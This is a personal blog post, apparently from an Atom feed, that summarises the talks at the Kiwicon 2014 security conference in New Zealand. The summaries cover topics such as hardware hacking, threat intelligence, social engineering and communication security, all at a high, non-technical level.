&lt;p&gt;This was most definitely one of the most interesting, exciting, and downright awesome &amp;#39;con experiences i&amp;#39;ve ever had! In the past i&amp;#39;ve pretty much kept to myself, watched the talks and headed home, but hung out/chatted/discussed with a lot of people over the course of the week, and it was epic! So so so definitely worthwhile!!&lt;/p&gt;

&lt;p&gt;Not sure of the best way to go about this, so will just list out the different presentations and anything of interest/note from them.&lt;/p&gt;

&lt;p&gt;I assume slides/etc should be up later on, so if something looks interesting, keep an eye out for that.&lt;/p&gt;

&lt;h2&gt;&lt;a href=&quot;http://2014.kiwicon.org/the-con/schedule/#Thursday11December&quot;&gt;Thursday&lt;/a&gt;&lt;/h2&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://kiwicon.org/the-con/talks/#e146&quot;&gt;Eve, Mallory, Ocean&amp;#39;s 11, and Jack Bauer: Adversaries Real and Imagined&lt;/a&gt;

&lt;ul&gt;
&lt;li&gt;Nice overview of the different kinds of attackers, what they tend to be after, etc&lt;/li&gt;
&lt;li&gt;Basically highlighted that you need to know what they are after and what it is worth, and balance security accordingly&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://2014.kiwicon.org/the-con/talks/#e149&quot;&gt;Breaking Bricks and Plumbing Pipes: Cisco ASA a Super Mario Adventure&lt;/a&gt;

&lt;ul&gt;
&lt;li&gt;Interesting talk about a plethora of security flaws found in Cisco firewall to gain a pivot point into the network&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://2014.kiwicon.org/the-con/talks/#e150&quot;&gt;Asymmetric Defense, and your buyers guide to Threat Intelligence&lt;/a&gt;

&lt;ul&gt;
&lt;li&gt;Essentially talked about how a lot of &amp;#39;threat intelligence&amp;#39; out there is crap, and treated as &amp;#39;more is better&amp;#39; rather than &amp;#39;&amp;#39;better is better&amp;#39;&lt;/li&gt;
&lt;li&gt;Talked about how there needs to be standardises formats for digitally sharing/consuming threat intelligence&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://2014.kiwicon.org/the-con/talks/#e151&quot;&gt;Seeing Blu&lt;/a&gt;

&lt;ul&gt;
&lt;li&gt;Step by step walkthrough and thought process of how he hacked his BluRay player to enable multi region support so he could watch his copy of Hackers.&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://2014.kiwicon.org/the-con/talks/#e152&quot;&gt;OneRNG - a verifiable and Open Hardware Random Number Generator from NZ&lt;/a&gt;

&lt;ul&gt;
&lt;li&gt;Small open source/hardware device to generate truly random entropy, to be fed back into a random number generator&lt;/li&gt;
&lt;li&gt;Recently released on kickstarter: &lt;a href=&quot;https://www.kickstarter.com/projects/moonbaseotago/onerng-an-open-source-entropy-generator&quot;&gt;https://www.kickstarter.com/projects/moonbaseotago/onerng-an-open-source-entropy-generator&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://2014.kiwicon.org/the-con/talks/#e147&quot;&gt;Eradicating the Human Problem&lt;/a&gt;

&lt;ul&gt;
&lt;li&gt;Really excellent talk by @lady_nerd talking about social engineering and humans as the weak point in security&lt;/li&gt;
&lt;li&gt;Talked about how we need a better way to assess and track the human element of security, rather than treating it as too hard/unobtainable&lt;/li&gt;
&lt;li&gt;Briefly discussed a tool in development designed to assist with mapping out the social interactions of a company in a way that allows assessing potential risk/etc, and determining the flow of an attack through the social elements of a company&lt;/li&gt;
&lt;li&gt;Slides: &lt;blockquote class=&quot;twitter-tweet&quot;&gt;&lt;p lang=&quot;en&quot; dir=&quot;ltr&quot;&gt;Want to see the trailer/slides for my &lt;a href=&quot;https://twitter.com/hashtag/kiwicon?src=hash&quot;&gt;#kiwicon&lt;/a&gt; talk &amp;#39;Eradicating the human problem&amp;#39;. Here&amp;#39;s a blog post with links &lt;a href=&quot;http://t.co/I5bacKHRVb&quot;&gt;&lt;a href=&quot;http://t.co/I5bacKHRVb&quot;&gt;http://t.co/I5bacKHRVb&lt;/a&gt;&lt;/a&gt;&lt;/p&gt;&amp;mdash; Laura Bell (@lady&lt;em&gt;nerd) &amp;lt;a href=&amp;quot;&lt;a href=&quot;https://twitter.com/lady&quot;&gt;https://twitter.com/lady&lt;/a&gt;&lt;/em&gt;nerd/status/544230404170194945&amp;quot;&amp;gt;December 14, 2014&lt;/a&gt;&lt;/blockquote&gt;
&lt;script async src=&quot;//platform.twitter.com/widgets.js&quot; charset=&quot;utf-8&quot;&gt;&lt;/script&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://2014.kiwicon.org/the-con/talks/#e142&quot;&gt;Security the Etsy way: Effective security in a continuous deployment culture&lt;/a&gt;

&lt;ul&gt;
&lt;li&gt;Excellent talk by @iodboi about mixing in security people with the general developers, not blocking progress/saying no while still maintaining security, making security liked/approachable, etc.&lt;/li&gt;
&lt;li&gt;So many awesome points and discussions, not to mention showing just how epic a place Etsy is to work.&lt;/li&gt;
&lt;li&gt;Caught up with him a decent bit after his talk and had some awesome chats, a really cool and down to earth guy&lt;/li&gt;
&lt;li&gt;Etsy are a great example of continuous deployment, with upwards of 50 pushes into production every day&lt;/li&gt;
&lt;li&gt;One of the big points: Don&amp;#39;t hire assholes (they will ruin all of the work you put in to enhance security/etcs image and drag everyone down) &lt;blockquote class=&quot;twitter-tweet&quot;&gt;&lt;p lang=&quot;en&quot; dir=&quot;ltr&quot;&gt;Excellent security team management advice from &lt;a href=&quot;https://twitter.com/iodboi&quot;&gt;@iodboi&lt;/a&gt; :) &lt;a href=&quot;https://twitter.com/kiwicon&quot;&gt;@kiwicon&lt;/a&gt; &lt;a href=&quot;http://t.co/8m5ZyjYFfV&quot;&gt;pic.twitter.com/8m5ZyjYFfV&lt;/a&gt;&lt;/p&gt;&amp;mdash; Leigh Honeywell (@hypatiadotca) &lt;a href=&quot;https://twitter.com/hypatiadotca/status/542870405514801152&quot;&gt;December 11, 2014&lt;/a&gt;&lt;/blockquote&gt;
&lt;script async src=&quot;//platform.twitter.com/widgets.js&quot; charset=&quot;utf-8&quot;&gt;&lt;/script&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://2014.kiwicon.org/the-con/talks/#e153&quot;&gt;COMSEC - Beyond Encryption&lt;/a&gt;

&lt;ul&gt;
&lt;li&gt;Discussion on maintaining communication security, tools that are good/bad, etc&lt;/li&gt;
&lt;li&gt;Almost surprisingly, Apple factime rates pretty highly on the list.&lt;/li&gt;
&lt;li&gt;Pond considered THE thing to use &lt;a href=&quot;https://pond.imperialviolet.org/&quot;&gt;https://pond.imperialviolet.org/&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://2014.kiwicon.org/the-con/talks/#e154&quot;&gt;MitMing GSM with criminal intent&lt;/a&gt;

&lt;ul&gt;
&lt;li&gt;Discussed the analysis and thinking, and eventual pwning of a GSM enabled home detention ankle monitor&lt;/li&gt;
&lt;li&gt;Made front page of the newspaper for the talk: &lt;a href=&quot;http://www.nzherald.co.nz/nz/news/article.cfm?c_id=1&amp;amp;objectid=11373524&quot;&gt;http://www.nzherald.co.nz/nz/news/article.cfm?c_id=1&amp;amp;objectid=11373524&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;Same guy who broke the NZ transport card system last year&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://2014.kiwicon.org/the-con/talks/#e143&quot;&gt;Building a hipster catapult, or how2own your skateboard&lt;/a&gt;

&lt;ul&gt;
&lt;li&gt;Amusing talk about taking over control of a bluetooth controlled electric skateboard, including demonstration&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h2&gt;&lt;a href=&quot;http://2014.kiwicon.org/the-con/schedule/#Friday12December&quot;&gt;Friday&lt;/a&gt;&lt;/h2&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;http://2014.kiwicon.org/the-con/talks/#e167&quot;&gt;R00t Causes: complex systems failures and security incident response&lt;/a&gt;

&lt;ul&gt;
&lt;li&gt;Analysis of a bridge collapse and how similar events map into security&lt;/li&gt;
&lt;li&gt;Some key points: compartmentalise/isolate&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://2014.kiwicon.org/the-con/talks/#e156&quot;&gt;ThruGlassXfer: The TV people? Do you see them?&lt;/a&gt;

&lt;ul&gt;
&lt;li&gt;Interesting proof of concept and discussion on using the pixels on a screen and a video camera, combined with a programmable keyboard to initiate an &amp;#39;&amp;#39;air gapped&amp;#39; bidirectional communications channel.&lt;/li&gt;
&lt;li&gt;Proves that if you can see it on the screen, and type into it, then you can basically bypass any other security in your way&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://thruglassxfer.com&quot;&gt;http://thruglassxfer.com&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://2014.kiwicon.org/the-con/talks/#e144&quot;&gt;Cyberwar before there was Cyber: Hacking WWII Electronic Bomb Fuses&lt;/a&gt;

&lt;ul&gt;
&lt;li&gt;Research/analyse on various types of german bomb fuses, and the evolution of design/defuser used to outsmart each other&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://2014.kiwicon.org/the-con/talks/#e157&quot;&gt;BeEF for Vegetarians (Hooked Browser Meshed-Networks with WebRTC)&lt;/a&gt;

&lt;ul&gt;
&lt;li&gt;Pretty cool talk by @xntrik (co-author of browser hackers handbook) about creating mesh networks from exploited browsers to minimize detection/etc from communication with the command server&lt;/li&gt;
&lt;li&gt;Useful for circumventing/stealthing internal lateral exploration through a network&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://2014.kiwicon.org/the-con/talks/#e158&quot;&gt;An Image is Worth 1000 Frauds â€“ Detecting Fake Images and Videos&lt;/a&gt;

&lt;ul&gt;
&lt;li&gt;Interesting high level runthrough of some methods you can use to detect manipulated images/video&lt;/li&gt;
&lt;li&gt;Linked to &lt;a href=&quot;https://github.com/ebemunk/phoenix&quot;&gt;https://github.com/ebemunk/phoenix&lt;/a&gt; a lot&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://2014.kiwicon.org/the-con/talks/#e159&quot;&gt;Manipulating Human Minds: The Psychological Side of Social Engineering&lt;/a&gt;

&lt;ul&gt;
&lt;li&gt;Interesting talk by @0xkitty that takes a high level look at some of things involved in social engineering and manipulating the human element of security&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;Lightning talks (shorter)

&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;http://2014.kiwicon.org/the-con/talks/#e160&quot;&gt;Recap of the aftermath of last year&amp;#39;s bus hacking&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;Decent recap of what happened/how the incident was handled (eg. poorly)&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://2014.kiwicon.org/the-con/talks/#e161&quot;&gt;The National Cyber Security Strategy and the Connect Smart Partnership&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;Some goverment guy that wasn&amp;#39;t very engaging&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://2014.kiwicon.org/the-con/talks/#e162&quot;&gt;I know what you did last Wednesday: exploitation of the humble apartment video intercom&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;Hacked his embedded linux apartment intercomm system to find exploits that enabled stealth monitoring of EVERY apartment in his building (100&amp;#39;s)&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://2014.kiwicon.org/the-con/talks/#e163&quot;&gt;Voltron: Defender of the Universe&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;Terminal based &amp;#39;GUI&amp;#39; for GDB debugging&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://github.com/snare/voltron&quot;&gt;https://github.com/snare/voltron&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://2014.kiwicon.org/the-con/talks/#e145&quot;&gt;Random() Adventures in Minecrosoftcraft&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;A practical example of using analyses to defeat insecure &amp;#39;random&amp;#39; implementations in the context of minecraft&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://2014.kiwicon.org/the-con/talks/#e164&quot;&gt;Legal loopholes&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;Some talk about grey areas of the law/etc&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://2014.kiwicon.org/the-con/talks/#e165&quot;&gt;Breaking AV software&lt;/a&gt;

&lt;ul&gt;
&lt;li&gt;Really interesting talk about just how insecure/terrible antivirus/security products in general can be (hint: VERY)&lt;/li&gt;
&lt;li&gt;Showed how a large number of the top AV engines can actually end up making your system less secure due to the way they are implemented.&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://2014.kiwicon.org/the-con/talks/#e166&quot;&gt;Hackers and Hacks, or: How I Learned to Stop Worrying and Love the MSM&lt;/a&gt;

&lt;ul&gt;
&lt;li&gt;An enlightening talk by the reporters who engaged with &amp;#39;&amp;#39;rawshark&amp;#39; and the process/pitfalls they went through to in securely communicating to release the information.&lt;/li&gt;
&lt;li&gt;Made some good points about security being hard for the &amp;#39;&amp;#39;average&amp;#39; person, and how so very major stories (eg. Snowden) were almost missed out on because reporters don&amp;#39;t understand how to security well enough&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h2&gt;&lt;a href=&quot;http://2014.kiwicon.org/the-con/schedule/#Saturday13December&quot;&gt;Saturday&lt;/a&gt;&lt;/h2&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;http://2014.kiwicon.org/the-con/events/#e148&quot;&gt;Kiwicon SPIT ROAST&lt;/a&gt;

&lt;ul&gt;
&lt;li&gt;We ate lots of meat, in a fortress!!&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ul&gt;</content><author><name>devalias</name></author><category term="kiwicon" /><category term="security" /><category term="conference" /><category term="hacking" /><category term="new-zealand" /><category term="2014" /><summary>Kiwicon


2014
Schedule
Talks</summary></entry></feed>
